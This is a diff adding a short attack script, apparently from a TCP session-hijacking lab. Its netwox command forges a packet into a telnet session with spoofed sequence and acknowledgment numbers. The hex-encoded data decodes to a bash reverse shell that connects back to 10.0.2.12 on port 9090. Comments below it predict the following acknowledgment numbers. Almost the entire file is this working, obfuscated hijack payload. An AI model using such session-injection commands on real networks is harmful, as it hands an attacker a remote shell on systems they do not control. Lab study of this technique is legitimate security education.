@@ -1,0 +1,9 @@
+sudo netwox 40 --ip4-src "10.0.2.13" --ip4-dst "10.0.2.8" \
+--ip4-ttl 64 --tcp-src 37416 --tcp-dst 23 --tcp-seqnum 3569830503 \
+--tcp-window 237 --tcp-acknum 3717287807 --tcp-ack \
+--tcp-data "2f62696e2f62617368202d69203e202f6465762f7463702f31302e302e322e31322f3930393020303c263120323e2631200d"
+
+# 1st acknum: 1300099908
+# 2nd acknum: 1300099931
+# predict 3rd:1300099954
+# next: 1300099977
